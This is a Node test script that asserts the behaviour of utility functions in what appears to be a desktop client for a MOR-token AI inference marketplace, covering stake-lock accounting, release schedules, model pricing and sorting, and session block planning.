import { readFileSync } from 'node:fs';
import {
  buildGrokLaunchScript,
  buildGrokModelsToml,
  grokModelKey,
  selectGrokModels,
} from '../../src/main/src/grok/models-config.ts';
import {
  SessionOfferGate,
  claimNewestOffer,
} from '../../src/main/src/openai-compat/session-offers.ts';
// Node-runnable assertions over the PR's exported substrate utils.
// Run: npm run logic   (uses vite-node to transform the .ts/.tsx/.js sources)
import {
  morToWei,
  weiToMor,
  earlyCloseLock,
  nextStakeReleaseAt,
  stakeReleaseSchedule,
  sixMinuteStakeMor,
  modelPriceDisplay,
  sortModelsForPicker,
  modelMinPriceWei,
  modelProviderCount,
} from '../../src/renderer/src/utils/marketplace.ts';
import { formatMor } from '../../src/renderer/src/utils/coinValue.tsx';
import {
  admitRequest,
  bearerMatches,
  mergeStarredModels,
  needsSession,
  sessionRequiredMessage,
  toModelList,
  resolveModel,
  routingHeaders,
  errorBody,
} from '../../src/main/src/openai-compat/protocol.ts';
import {
  buildMorpheusConfig,
  buildLaunchScript,
  shellQuote,
} from '../../src/main/src/opencode/setup.ts';
import { buildProviderPlugin } from '../../src/main/src/opencode/start-plugin.ts';
import {
  checkCaps,
  spentToday,
  stakeForDuration,
  buildCatalog,
} from '../../src/main/src/openai-compat/sessions-api.ts';
import {
  MIN_REQUEST_SECONDS,
  strideSeconds,
  blocksForDuration,
  planBlocks,
  OVERLAP_SEC,
  CLOSE_BUFFER_SEC,
  reserveWei,
  requiredFreeStake,
  peakBlockStakes,
} from '../../src/renderer/src/components/keepalive/KeepAliveProvider.tsx';
import {
  isSecureModel,
  SECURE_TAG,
  formatModelName,
  modelMatchesQuery,
  userTextFromPrompt,
  resolveChatSession,
  sessionsClaimedByOtherChats,
  claimedSessionIds,
  adoptableSessions,
  orphanedSessions,
} from '../../src/renderer/src/components/chat/utils.js';
import { buildModelsWithBids, buildModelsData } from '../../src/renderer/src/store/queries.ts';
import {
  getLiveSessionsByUser,
  SESSION_PAGE_LIMIT,
  SESSION_PAGE_BATCH,
} from '../../src/renderer/src/store/utils/apiCallsHelper.tsx';
import {
  parseDuration,
  durationSuggestions,
  formatDurationLong,
  formatDurationShort,
} from '../../src/renderer/src/utils/duration.ts';

let pass = 0;
let fail = 0;
const ok = (name, cond) => {
  if (cond) {
    pass++;
    console.log(`  ✓ ${name}`);
  } else {
    fail++;
    console.error(`  ✗ ${name}`);
  }
};
const throws = (name, fn) => {
  let threw = false;
  try {
    fn();
  } catch {
    threw = true;
  }
  ok(name, threw);
};

console.log('marketplace: morToWei / weiToMor (precision-safe wei)');
ok("morToWei('1.5') = 1.5e18 wei", morToWei('1.5') === 1500000000000000000n);
ok("morToWei('0') = 0n", morToWei('0') === 0n);
ok(
  'wei > 2^53 keeps integer precision',
  morToWei('9007199254740993') === 9007199254740993000000000000000000n,
);
throws("morToWei('') throws", () => morToWei(''));
throws("morToWei('1.2.3') throws", () => morToWei('1.2.3'));
throws('morToWei with 19 decimals throws', () =>
  morToWei('1.0000000000000000001'),
);
ok('round-trip weiToMor(morToWei) = input', weiToMor(morToWei('123.456')) === '123.456');
ok('weiToMor strips trailing zeros', weiToMor(1500000000000000000n) === '1.5');
ok('weiToMor negative', weiToMor(-1500000000000000000n) === '-1.5');

console.log('coinValue: formatMor (nullable, magnitude-scaled)');
ok('formatMor(NaN) = null', formatMor(Number.NaN) === null);
ok('formatMor(Infinity) = null', formatMor(Number.POSITIVE_INFINITY) === null);
ok("formatMor(0) = '0'", formatMor(0) === '0');
ok("tiny stake -> '< 0.000001'", formatMor(500, 18) === '< 0.000001');
ok("0.5 MOR -> '0.5'", formatMor(5e17, 18) === '0.5');
ok("5 MOR -> '5.00'", formatMor(5e18, 18) === '5.00');
ok('2000 MOR -> localized', formatMor(2000e18, 18) === (2000).toLocaleString());

console.log('chat/utils: secure-model + name + search');
ok("SECURE_TAG = 'tee'", SECURE_TAG === 'tee');
ok('isSecureModel: TEE tag -> true', isSecureModel({ Tags: ['reasoning', 'TEE'] }) === true);
ok('isSecureModel: no TEE -> false', isSecureModel({ Tags: ['general'] }) === false);
ok('isSecureModel: null Tags -> false', isSecureModel({ Tags: null }) === false);
ok(
  "formatModelName('deepseek-v4-pro') = 'Deepseek V4 Pro'",
  formatModelName('deepseek-v4-pro') === 'Deepseek V4 Pro',
);
ok(
  "formatModelName keeps size tokens shouting (8B)",
  formatModelName('llama_3_1_8b_instruct') === 'Llama 3 1 8B Instruct',
);
ok(
  "modelMatchesQuery multi-word across hyphens",
  modelMatchesQuery({ Name: 'deepseek-v4-pro' }, 'deepseek v4 pro') === true,
);
ok(
  'modelMatchesQuery: non-match -> false',
  modelMatchesQuery({ Name: 'llama-3' }, 'deepseek') === false,
);
ok('modelMatchesQuery: matches a tag', modelMatchesQuery({ Name: 'x', Tags: ['vision'] }, 'vision') === true);

console.log('queries: buildModelsWithBids (provider-walk merge)');
const md = {
  providers: [{ Address: '0xAA' }, { Address: '0xBB' }],
  models: [
    { Id: 'm1', isLocal: false },
    { Id: 'm2', isLocal: false },
    { Id: 'local', isLocal: true },
  ],
};
const fetcher = async () =>
  new Map([
    ['m1', [{ Provider: '0xaa', Id: 'b1' }]],
    ['m2', [{ Provider: '0xZZ', Id: 'b2' }]], // provider not in map -> dropped
  ]);
const merged = await buildModelsWithBids(md, fetcher);
ok('null md -> []', (await buildModelsWithBids(null, fetcher)).length === 0);
ok('local model skipped', !merged.some((m) => m.Id === 'local'));
ok('m1 present with a bid', merged.find((m) => m.Id === 'm1')?.bids?.length === 1);
ok('bid gets ProviderData attached', !!merged.find((m) => m.Id === 'm1')?.bids[0]?.ProviderData);
ok('model with only an unmatched-provider bid dropped (m2)', !merged.some((m) => m.Id === 'm2'));

// ---- earlyCloseLock: what the Close button costs you -----------------------
// Anchored to a REAL on-chain session (0xc78d14…, Base 8453, 2026-07-16) where
// the operator closed a 6-min session at 3 min and ~2.7 MOR silently vanished
// for a day. These numbers are the chain's, not invented: stake 5.360550 MOR,
// openedAt 1784262329, endsAt 1784262688 (359s), closedAt 1784262509 (180s in).
console.log('');
console.log('queries: earlyCloseLock (the Close button warning)');
{
  const REAL = {
    Stake: '5360549929977675947',
    OpenedAt: 1784262329,
    EndsAt: 1784262688,
  };
  const atClose = earlyCloseLock(REAL, 1784262509);
  ok('real session: priced', atClose.known && atClose.isEarly);
  // getSession reported providerWithdrawnAmount 0.008333 MOR and hold_ carried
  // ~2.69 for this session; predicted lock must land on that, not near it.
  ok(
    `real session: locks ~2.6877 MOR (got ${weiToMor(atClose.lockedWei, 4)})`,
    weiToMor(atClose.lockedWei, 4) === '2.6877',
  );
  ok(
    `real session: returns ~2.6728 MOR (got ${weiToMor(atClose.returnedWei, 4)})`,
    weiToMor(atClose.returnedWei, 4) === '2.6728',
  );
  ok('real session: nothing is lost — locked + returned == stake',
    atClose.lockedWei + atClose.returnedWei === BigInt(REAL.Stake));
  // startOfDay(1784262509) = 1784246400 -> unlock 1784332800
  ok('real session: unlock is startOfDay(close) + 1 day', atClose.unlockAt === 1784332800);

  // Running to the end locks EVERYTHING — the opposite of what this block used
  // to assert. It pinned "closing AT endsAt locks nothing", from the vendored
  // contract's `if (!isClosingLate_)` guard. Measured on Base mainnet
  // 2026-08-06, the deployed Diamond has no such guard: two sessions run to
  // their full 1799s and closed 3s and 31s LATE returned 0.0156 of 28.1569 MOR
  // (0.06%) and pushed the rest onto userStakesOnHold, matched to the wei
  // against the hold delta at the closing block. A session that used all its
  // time has nothing unused to refund.
  const atEnd = earlyCloseLock(REAL, 1784262688);
  ok('closing AT endsAt locks the WHOLE stake', atEnd.known && atEnd.lockedWei === BigInt(REAL.Stake));
  ok('closing at endsAt returns nothing', atEnd.returnedWei === 0n);
  ok('closing at endsAt is not flagged early', !atEnd.isEarly);
  const after = earlyCloseLock(REAL, 1784262688 + 999);
  ok('closing AFTER endsAt still locks the whole stake', after.lockedWei === BigInt(REAL.Stake));
  ok('closing after endsAt does not report negative time-to-end', after.secondsUntilEnd === 0);
  ok('waiting locks MORE than closing early, never less', atEnd.lockedWei > atClose.lockedWei);

  // THE BOUNDARY the check above cannot reach: endsAt+999 is still inside the
  // same UTC day. The lock covers only the part of the session lying in the
  // day the close lands in, so a close on a LATER UTC day locks NOTHING and
  // refunds in full — max(openedAt, startOfDay) then exceeds min(endsAt, now).
  //
  // Not a guess. Measured on Base mainnet 2026-08-07: three sessions that ended
  // 2026-08-06T04:14Z and were closed 2026-08-07T00:08Z returned 50000.0000 of
  // 50000.0000 MOR staked, hold delta exactly 0. They also did NOT revert,
  // which rules out the underflow this expression would suffer if the deployed
  // contract were the vendored one minus its guard.
  const nextDay = earlyCloseLock(REAL, 1784332800 + 483); // past the next UTC midnight
  ok('a close on the NEXT UTC day locks nothing', nextDay.known && nextDay.lockedWei === 0n);
  ok('a close on the next UTC day refunds in full',
    nextDay.returnedWei === BigInt(REAL.Stake));
  ok('the same-day/next-day split is real, not a rounding artefact',
    atEnd.lockedWei === BigInt(REAL.Stake) && nextDay.lockedWei === 0n);

  // Monotonic: the longer you wait (within the session) the more is locked.
  const early = earlyCloseLock(REAL, 1784262329 + 30);
  ok('locks less 30s in than 180s in', early.lockedWei < atClose.lockedWei);
  ok('locking is proportional at the halfway point',
    earlyCloseLock({ Stake: '1000', OpenedAt: 1784246400, EndsAt: 1784246400 + 100 }, 1784246400 + 50)
      .lockedWei === 500n);

  // An unpriceable session must produce NO number rather than a wrong one — a
  // fabricated MOR figure on a money warning is worse than no warning.
  ok('missing Stake -> not known', !earlyCloseLock({ OpenedAt: 1, EndsAt: 2 }, 1).known);
  ok('missing EndsAt -> not known', !earlyCloseLock({ Stake: '1', OpenedAt: 1 }, 1).known);
  ok('null session -> not known', !earlyCloseLock(null, 1).known);
  ok('zero stake -> not known', !earlyCloseLock({ Stake: '0', OpenedAt: 1, EndsAt: 2 }, 1).known);
  ok('endsAt <= openedAt -> not known',
    !earlyCloseLock({ Stake: '10', OpenedAt: 500, EndsAt: 500 }, 400).known);
  ok('lock never exceeds the stake',
    earlyCloseLock({ Stake: '100', OpenedAt: 1784246400, EndsAt: 1784246401 }, 1784246400).lockedWei <= 100n);
}

// ---- nextStakeReleaseAt: WHEN the on-hold tile says it returns --------------
// Same real session: closed 1784262509 (2026-07-17 in UTC), so its lock releases
// at startOfDay(1784262509)+1day = 1784332800 (2026-07-18 00:00 UTC).
console.log('');
console.log('queries: nextStakeReleaseAt (the On Hold tile clock)');
{
  const REAL = { Stake: '5360549929977675947', OpenedAt: 1784262329, EndsAt: 1784262688, ClosedAt: 1784262509 };
  // Standing BEFORE that release, it is the next unlock.
  ok('early-closed session -> releaseAt 1784332800',
    nextStakeReleaseAt([REAL], 1784262600) === 1784332800);
  // Standing AFTER it, the entry has matured (auto-claimer's job) -> null.
  ok('after release -> null (matured, not a future date)',
    nextStakeReleaseAt([REAL], 1784332800 + 1) === null);
  // Exactly at release is matured too (contract frees at >=).
  ok('at the release second -> null',
    nextStakeReleaseAt([REAL], 1784332800) === null);

  // Closed LATE (>= endsAt) locks the WHOLE stake, so it very much contributes
  // a date. This pair used to assert the opposite ("no release, locks nothing"),
  // which meant the On Hold tile had no clock for exactly the closes the app
  // performs most — every naturally-expired block is a late close.
  const late = { ...REAL, ClosedAt: 1784262688 };
  ok('closed at endsAt -> releases at startOfDay(close) + 1 day',
    nextStakeReleaseAt([late], 1784262600) === 1784332800);
  const later = { ...REAL, ClosedAt: 1784262999 };
  ok('closed after endsAt -> still a release date',
    nextStakeReleaseAt([later], 1784262600) === 1784332800);

  // Still open (ClosedAt 0) -> nothing on hold from it.
  ok('open session -> no release',
    nextStakeReleaseAt([{ ...REAL, ClosedAt: 0 }], 1784262600) === null);

  // The EARLIEST future release wins across many sessions, and matured/late ones
  // do not drag it. Three early closes on three different UTC days:
  const day = 86400;
  const mk = (closedAt) => ({ Stake: '1000', OpenedAt: closedAt - 100, EndsAt: closedAt + 100, ClosedAt: closedAt });
  const d1 = 1784332800 + 10 * 3600; // closes on 2026-07-18 -> release 2026-07-19 00:00 = 1784419200
  const d2 = d1 + day; //                                    -> release +1 day
  const now = d1 - 3600;
  ok('earliest future release across sessions',
    nextStakeReleaseAt([mk(d2), mk(d1)], now) === 1784332800 + day);
  ok('a matured entry does not become "next"',
    nextStakeReleaseAt([mk(d1), { ...REAL, ClosedAt: 1784262509 }], now) === 1784332800 + day);

  // Robustness: never throw on junk, never invent a date.
  ok('empty -> null', nextStakeReleaseAt([], 1784262600) === null);
  ok('undefined -> null', nextStakeReleaseAt(undefined, 1784262600) === null);
  ok('missing fields -> null', nextStakeReleaseAt([{ foo: 1 }], 1784262600) === null);
}

// ---- stakeReleaseSchedule: MOR returning at MULTIPLE times -------------------
// The case a single "next release" hides: stake locked by sessions closed on
// different UTC days frees on different days, and the tile must show each chunk
// with its own amount and time — not the total at the earliest date.
console.log('');
console.log('queries: stakeReleaseSchedule (multi-session breakdown)');
{
  const day = 86400;
  // Two sessions on the SAME day at supply/budget=1 (lock = stake*elapsed/total):
  //   A: opened D+10, ends D+110, closed D+60  -> 50/100 of 1000 = 500, release D+day
  //   B: opened D+20, ends D+120, closed D+40  -> 20/100 of 2000 = 400, release D+day
  // Same release day -> ONE tranche summing 900.
  const D = 1784332800; // a UTC-midnight
  const A = { Stake: '1000', OpenedAt: D + 10, EndsAt: D + 110, ClosedAt: D + 60 };
  const B = { Stake: '2000', OpenedAt: D + 20, EndsAt: D + 120, ClosedAt: D + 40 };
  const now = D - 100; // before either releases
  const same = stakeReleaseSchedule([A, B], now);
  ok('same-day closes collapse to ONE tranche', same.length === 1);
  ok('same-day tranche sums the locks (500+400=900)', same[0]?.lockedWei === 900n);
  ok('same-day tranche releases at startOfDay+1day', same[0]?.releaseAt === D + day);

  // Two sessions on DIFFERENT days -> two tranches, earliest first.
  const C = { Stake: '1000', OpenedAt: D + day + 10, EndsAt: D + day + 110, ClosedAt: D + day + 60 };
  const multi = stakeReleaseSchedule([C, A], now);
  ok('different-day closes -> TWO tranches', multi.length === 2);
  ok('tranches sorted earliest-first', multi[0].releaseAt < multi[1].releaseAt);
  ok('first tranche is the earlier day', multi[0].releaseAt === D + day);
  ok('second tranche is the later day', multi[1].releaseAt === D + 2 * day);
  ok('each tranche carries its own amount', multi[0].lockedWei === 500n && multi[1].lockedWei === 500n);

  // Matured tranches drop out; only future remain. Stand AFTER A/B's release,
  // BEFORE C's -> just C.
  const afterFirst = stakeReleaseSchedule([A, B, C], D + day + 1);
  ok('matured tranche excluded, future kept', afterFirst.length === 1 && afterFirst[0].releaseAt === D + 2 * day);

  // The real session as a one-tranche schedule, amount matching earlyCloseLock.
  const REAL_S = { Stake: '5360549929977675947', OpenedAt: 1784262329, EndsAt: 1784262688, ClosedAt: 1784262509 };
  const real = stakeReleaseSchedule([REAL_S], 1784262600);
  ok('real session -> one tranche', real.length === 1);
  ok('real tranche amount == earlyCloseLock lock (2.6877)',
    weiToMor(real[0].lockedWei, 4) === '2.6877');
  ok('real tranche release == 1784332800', real[0].releaseAt === 1784332800);

  // nextStakeReleaseAt is now the head of the schedule — still the earliest.
  ok('nextStakeReleaseAt == first tranche',
    nextStakeReleaseAt([C, A], now) === multi[0].releaseAt);

  // Junk never throws, never invents a tranche.
  ok('schedule empty on []', stakeReleaseSchedule([], now).length === 0);
  ok('schedule empty on junk', stakeReleaseSchedule([{ foo: 1 }], now).length === 0);
  ok('open session -> no tranche', stakeReleaseSchedule([{ ...A, ClosedAt: 0 }], now).length === 0);
}

// ---- userTextFromPrompt: resumed-chat bubbles show the RIGHT prompt ----------
// The bug: proxy-router stores each turn with the full prepended conversation in
// prompt.messages, so messages[0] is always the first turn — every bubble in a
// resumed chat rendered as the opening prompt. Fixture is the operator's real
// stored chat 0x056db22a (turns of length 1,3,5,7), each turn's expected text
// being the LAST user message.
console.log('');
console.log('queries: userTextFromPrompt (resumed-chat bubble text)');
{
  // Real prepended shapes, growing [u], [u,a,u], [u,a,u,a,u], …
  const turn0 = { messages: [{ role: 'user', content: 'hello' }] };
  const turn1 = {
    messages: [
      { role: 'user', content: 'hello' },
      { role: 'assistant', content: '你好！' },
      { role: 'user', content: 'speak in english' },
    ],
  };
  const turn2 = {
    messages: [
      { role: 'user', content: 'hello' },
      { role: 'assistant', content: '你好！' },
      { role: 'user', content: 'speak in english' },
      { role: 'assistant', content: 'Of course!' },
      { role: 'user', content: 'what language were you speaking in' },
    ],
  };
  // THE bug: every turn must NOT collapse to "hello".
  ok('turn 0 -> "hello"', userTextFromPrompt(turn0) === 'hello');
  ok('turn 1 -> "speak in english" (NOT hello)', userTextFromPrompt(turn1) === 'speak in english');
  ok('turn 2 -> the third prompt (NOT hello)',
    userTextFromPrompt(turn2) === 'what language were you speaking in');
  ok('not all turns collapse to the first',
    new Set([turn0, turn1, turn2].map((t) => userTextFromPrompt(t))).size === 3);

  // Single-message turns (the other stored format) still work — last == first.
  ok('single-message turn -> its own text',
    userTextFromPrompt({ messages: [{ role: 'user', content: 'type 750 words' }] }) === 'type 750 words');

  // A trailing non-user entry must not become the bubble text.
  ok('skips a trailing assistant entry',
    userTextFromPrompt({
      messages: [
        { role: 'user', content: 'real prompt' },
        { role: 'assistant', content: 'stray' },
      ],
    }) === 'real prompt');

  // Other modalities and junk.
  ok('TTS input', userTextFromPrompt({ input: 'say this aloud' }) === 'say this aloud');
  ok('STT audio placeholder', userTextFromPrompt({}, true) === '🎤 Audio input');
  ok('STT keeps a stored transcript', userTextFromPrompt({ prompt: 'transcribed' }, true) === 'transcribed');
  ok('empty prompt -> ""', userTextFromPrompt({}) === '');
  ok('null prompt -> ""', userTextFromPrompt(null) === '');
  ok('empty messages array -> "" (no crash)', userTextFromPrompt({ messages: [] }) === '');
}

// ---- model-picker pricing: MOR/s vs min-block stake ------------------------
// The min-block stake mirrors the marketplace floor used by the affordability
// gate: price * MIN_SESSION_SECONDS * supply / budget. That floor is 305s (the
// 300s contract minimum + a 5s cushion for the stake->duration truncation), NOT
// the old 360s — these expectations move with the constant, so if it changes
// again they fail here rather than silently misquoting the open cost. At
// supply/budget = 1 the arithmetic is legible (1e15 wei/s -> 0.305 MOR to open).
console.log('');
console.log('queries: sixMinuteStakeMor / modelPriceDisplay (picker toggle)');
{
  const meta1 = { supply: 1, budget: 1 };
  ok('1e15 wei/s -> 0.305 MOR to open', sixMinuteStakeMor(1e15, meta1) === 0.305);
  ok('2e15 wei/s -> 0.61 MOR', Math.abs(sixMinuteStakeMor(2e15, meta1) - 0.61) < 1e-9);
  ok('1e16 wei/s -> 3.05 MOR', Math.abs(sixMinuteStakeMor(1e16, meta1) - 3.05) < 1e-9);
  // The ratio scales it: supply/budget = 1000 -> 1000x the stake.
  ok('supply/budget ratio scales the stake',
    Math.abs(sixMinuteStakeMor(1e15, { supply: 1e24, budget: 1e21 }) - 305) < 1e-6);
  // Meta not loaded -> null (unknowable), never a fake 0.
  ok('no supply -> null', sixMinuteStakeMor(1e15, { budget: 1 }) === null);
  ok('zero budget -> null', sixMinuteStakeMor(1e15, { supply: 1, budget: 0 }) === null);
  ok('undefined meta -> null', sixMinuteStakeMor(1e15, undefined) === null);
  ok('non-positive price -> null', sixMinuteStakeMor(0, meta1) === null);

  // modelPriceDisplay: per-second is Number(price)/1e18.
  const bids = [
    { Id: 'b1', PricePerSecond: '1000000000000000' }, // 1e15
    { Id: 'b2', PricePerSecond: '2000000000000000' }, // 2e15
  ];
  const ps = modelPriceDisplay(bids, 'perSec', meta1);
  ok('perSec range 0.001–0.002 MOR/s',
    ps.kind === 'range' && Math.abs(ps.min - 0.001) < 1e-9 && Math.abs(ps.max - 0.002) < 1e-9);
  // Same bids in stake mode: 0.305–0.61 MOR to open.
  const st = modelPriceDisplay(bids, 'stake6m', meta1);
  ok('stake range 0.305–0.61 MOR',
    st.kind === 'range' && Math.abs(st.min - 0.305) < 1e-9 && Math.abs(st.max - 0.61) < 1e-9);
  // stake mode with NO meta -> offline, not a bogus number.
  ok('stake mode without meta -> offline',
    modelPriceDisplay(bids, 'stake6m', {}).kind === 'offline');
  // Single bid -> single, not range.
  ok('single bid -> single',
    modelPriceDisplay([bids[0]], 'perSec', meta1).kind === 'single');
  // No priceable bids -> offline.
  ok('no bids -> offline', modelPriceDisplay([], 'perSec', meta1).kind === 'offline');
  ok('bids without Id -> offline',
    modelPriceDisplay([{ PricePerSecond: '1' }], 'perSec', meta1).kind === 'offline');
  // The two modes must not agree on a nontrivial bid (proves the toggle changes
  // the number, not just the label).
  ok('perSec and stake differ',
    modelPriceDisplay(bids, 'perSec', meta1).min !==
      modelPriceDisplay(bids, 'stake6m', meta1).min);
}

// ---- sortModelsForPicker: order by cheapest / standard / most providers -----
console.log('');
console.log('queries: sortModelsForPicker (picker ordering)');
{
  const bid = (price) => ({ Id: 'b' + price, PricePerSecond: String(price) });
  // Cheap has the lowest price but ONE provider; Broad is dearer but has THREE;
  // Mid sits between. Zed is dearest, alphabetically last.
  const cheap = { Name: 'Cheap', isOnline: true, bids: [bid(1e15)] };
  const mid = { Name: 'Mid', isOnline: true, bids: [bid(3e15), bid(4e15)] };
  const broad = { Name: 'Broad', isOnline: true, bids: [bid(5e15), bid(6e15), bid(7e15)] };
  const zed = { Name: 'Zed', isOnline: true, bids: [bid(9e15)] };
  const offlineCheap = { Name: 'OfflineCheap', isOnline: false, bids: [bid(1e14)] };
  const all = [zed, broad, cheap, mid, offlineCheap];

  const names = (arr) => arr.map((m) => m.Name);

  // keys
  ok('modelMinPriceWei = cheapest bid', modelMinPriceWei(mid) === 3e15);
  ok('modelMinPriceWei = Infinity with no bids', modelMinPriceWei({ bids: [] }) === Infinity);
  ok('modelMinPriceWei = 0 for a local model (free)', modelMinPriceWei({ isLocal: true }) === 0);
  ok('modelProviderCount counts bids with Id', modelProviderCount(broad) === 3);

  // A local model is free, so "cheapest" puts it FIRST — ahead of the cheapest
  // paid model. This is what makes the flattened global sort correct: local no
  // longer sinks below the marketplace on Infinity.
  const localFree = { Name: 'MyLocal', isOnline: true, isLocal: true };
  const cheapWithLocal = names(sortModelsForPicker([cheap, mid, localFree], 'cheapest'));
  ok('cheapest: local (free) leads the paid models', cheapWithLocal[0] === 'MyLocal');
  ok('cheapest: paid models still follow in price order',
    cheapWithLocal.indexOf('Cheap') < cheapWithLocal.indexOf('Mid'));

  // cheapest: online by price asc, offline last (even though it is the cheapest).
  const byCheap = names(sortModelsForPicker(all, 'cheapest'));
  ok('cheapest: Cheap first', byCheap[0] === 'Cheap');
  ok('cheapest: order Cheap<Mid<Broad<Zed', JSON.stringify(byCheap.slice(0, 4)) === JSON.stringify(['Cheap', 'Mid', 'Broad', 'Zed']));
  ok('cheapest: offline model sorts LAST despite lowest price', byCheap[byCheap.length - 1] === 'OfflineCheap');

  // most providers: Broad(3) first, then the 1-provider models A–Z.
  const byProviders = names(sortModelsForPicker(all, 'mostProviders'));
  ok('mostProviders: Broad(3) first', byProviders[0] === 'Broad');
  ok('mostProviders: Mid(2) second', byProviders[1] === 'Mid');
  ok('mostProviders: 1-provider models tie-break A–Z (Cheap<Zed)',
    byProviders.indexOf('Cheap') < byProviders.indexOf('Zed'));

  // standard: online, local-first, then A–Z.
  const local = { Name: 'zzz-local', isOnline: true, isLocal: true };
  const byStd = names(sortModelsForPicker([zed, cheap, local], 'standard'));
  ok('standard: local first even if name is last', byStd[0] === 'zzz-local');
  ok('standard: then alphabetical (Cheap<Zed)', byStd.indexOf('Cheap') < byStd.indexOf('Zed'));

  // the three modes must actually differ on this fixture.
  ok('the three sorts are not all identical',
    new Set([
      JSON.stringify(byCheap),
      JSON.stringify(byProviders),
      JSON.stringify(names(sortModelsForPicker(all, 'standard'))),
    ]).size === 3);

  // purity + robustness.
  ok('does not mutate the input', (() => { const a = [zed, cheap]; sortModelsForPicker(a, 'cheapest'); return a[0] === zed; })());
  ok('undefined input -> []', sortModelsForPicker(undefined, 'cheapest').length === 0);
  ok('two no-price models tie to name, no NaN scramble',
    JSON.stringify(names(sortModelsForPicker(
      [{ Name: 'B', isOnline: true }, { Name: 'A', isOnline: true }], 'cheapest'))) === JSON.stringify(['A', 'B']));
}

// ---- rolling-session block accounting --------------------------------------
// blocksForDuration prices the run; scheduleNext decides when to stop opening.
// They are twins: if they disagree, the affordability gate quotes one number and
// the wallet pays another.
//
// Honest about what this is: `walk` re-derives the count from the scheduler's
// rule, so it is a MIRROR of planBlocks, not an independent oracle — it catches
// the two drifting apart, which is the failure that has actually happened twice
// here, but it cannot tell you the shared rule is wrong. The bounds asserted in
// "a chained run stops at the length that was sold" below are the independent
// part: they constrain the OUTCOME (how far past/short of the ask the run may
// stay staked) rather than re-deriving the count.
//
// The rule changed once already: blocks were assumed to tile end-to-end when
// seamless overlaps by OVERLAP_SEC (a 2-block purchase opened 3). It changed
// again when adversarial review found the last block was always full-size, so an
// 8-day ask stayed staked ~14 days. Both fixes are pinned below.
console.log('');
console.log('queries: blocksForDuration vs the scheduler stop condition');
{
  const walk = (targetSec, overlap, unit = MIN_REQUEST_SECONDS) => {
    let endsAt = Math.max(
      MIN_REQUEST_SECONDS,
      Math.min(unit, Math.max(targetSec, MIN_REQUEST_SECONDS)),
    );
    let opens = 1;
    for (;;) {
      // Stop when what is left is shorter than the shortest session the chain
      // sells — covering it would mean staking a whole further block.
      if (targetSec - endsAt < MIN_REQUEST_SECONDS) return { opens, coverTo: endsAt };
      const fireAt = overlap ? endsAt - OVERLAP_SEC : endsAt + CLOSE_BUFFER_SEC;
      const next = Math.max(MIN_REQUEST_SECONDS, Math.min(unit, targetSec - fireAt));
      endsAt = fireAt + next;
      opens++;
      if (opens > 5000) return { opens, coverTo: endsAt }; // runaway guard
    }
  };
  const maxSec =
    Math.floor((8 * 60 * 60) / MIN_REQUEST_SECONDS) * MIN_REQUEST_SECONDS;
  for (const overlap of [true, false]) {
    const mode = overlap ? 'seamless' : 'economy';
    let mismatch = null;
    let uncovered = null;
    let overshot = null;
    for (let sec = MIN_REQUEST_SECONDS; sec <= maxSec; sec += MIN_REQUEST_SECONDS) {
      const w = walk(sec, overlap);
      if (blocksForDuration(sec, overlap) !== w.opens) {
        mismatch ??= { sec, priced: blocksForDuration(sec, overlap), opened: w.opens };
      }
      // Coverage may now fall SHORT by less than one contract minimum (the
      // dropped remainder) — but never by more, and never long by more.
      if (sec - w.coverTo >= MIN_REQUEST_SECONDS) uncovered ??= { sec, coverTo: w.coverTo };
      if (w.coverTo - sec >= MIN_REQUEST_SECONDS) overshot ??= { sec, coverTo: w.coverTo };
    }
    ok(`${mode}: priced blocks == blocks actually opened, every length`,
      mismatch === null, mismatch && JSON.stringify(mismatch));
    ok(`${mode}: the run covers the length sold, to within one contract minimum`,
      uncovered === null, uncovered && JSON.stringify(uncovered));
    ok(`${mode}: the run never stays staked a whole block past the ask`,
      overshot === null, overshot && JSON.stringify(overshot));
  }
  // The overlap used to cost a whole extra block here: a 2-block purchase
  // opened 3, because the 25s the overlap left uncovered pulled in a full third
  // block. It now stops 25s short instead — a rounding the user cannot feel,
  // against a third stake they certainly could.
  ok('a 2-block ask is 2 blocks, not 3 (the overlap no longer buys one)',
    blocksForDuration(2 * MIN_REQUEST_SECONDS, true) === 2);
  ok('and the shortfall is exactly the overlap, nothing more',
    2 * MIN_REQUEST_SECONDS - walk(2 * MIN_REQUEST_SECONDS, true).coverTo === OVERLAP_SEC);
  // Counts are derived, never pinned as literals: the old 103/92 encoded the
  // full-size-final-block behaviour that adversarial review found was costing
  // users a whole extra block of lockup. The load-bearing claim is that the
  // count is the walked one AND differs from the naive ceil(target/block) = 94.
  for (const overlap of [true, false]) {
    const mode = overlap ? 'seamless' : 'economy';
    const walked = walk(maxSec, overlap).opens;
    ok(`${mode} max prices ${walked} opens, not the naive 94`,
      blocksForDuration(maxSec, overlap) === walked && walked !== 94);
  }
  ok('a single block is 1 in both modes',
    blocksForDuration(MIN_REQUEST_SECONDS, true) === 1 &&
    blocksForDuration(MIN_REQUEST_SECONDS, false) === 1);
}

// ---- the same accounting at the SEVEN-DAY block unit -------------------------
// The block unit is a parameter now: a session shorter than the chain's cap is
// bought outright as ONE block of exactly that length, and only a longer span
// chains cap-sized blocks. The twin invariant above has to hold at that unit
// too, or a "2 years" plan prices a different number of week-long stakes than
// it opens — and each of those is orders of magnitude larger than a 305s one.
console.log('');
console.log('queries: block accounting at the 7-day cap unit');
{
  const CAP = 7 * 24 * 60 * 60;
  // Same rule as the scheduler: last block cut to the remainder, sub-minimum
  // remainders dropped rather than rounded up to a whole week.
  const walk = (targetSec, overlap, unit) => {
    let endsAt = Math.max(
      MIN_REQUEST_SECONDS,
      Math.min(unit, Math.max(targetSec, MIN_REQUEST_SECONDS)),
    );
    let opens = 1;
    for (;;) {
      if (targetSec - endsAt < MIN_REQUEST_SECONDS) return { opens, coverTo: endsAt };
      const fireAt = overlap ? endsAt - OVERLAP_SEC : endsAt + CLOSE_BUFFER_SEC;
      const next = Math.max(MIN_REQUEST_SECONDS, Math.min(unit, targetSec - fireAt));
      endsAt = fireAt + next;
      opens++;
      if (opens > 5000) return { opens, coverTo: endsAt }; // runaway guard
    }
  };
  for (const overlap of [true, false]) {
    const mode = overlap ? 'seamless' : 'economy';
    let mismatch = null;
    let uncovered = null;
    // A year of week-long blocks, stepped by the day — dense enough to catch an
    // off-by-one at a boundary without walking two years of seconds.
    for (let sec = CAP; sec <= 366 * 24 * 60 * 60; sec += 24 * 60 * 60) {
      const w = walk(sec, overlap, CAP);
      if (blocksForDuration(sec, overlap, CAP) !== w.opens) {
        mismatch ??= { sec, priced: blocksForDuration(sec, overlap, CAP), opened: w.opens };
      }
      // A dropped remainder may leave the run short — by seconds, never by a
      // block. The bound is the claim; exact coverage is not achievable once
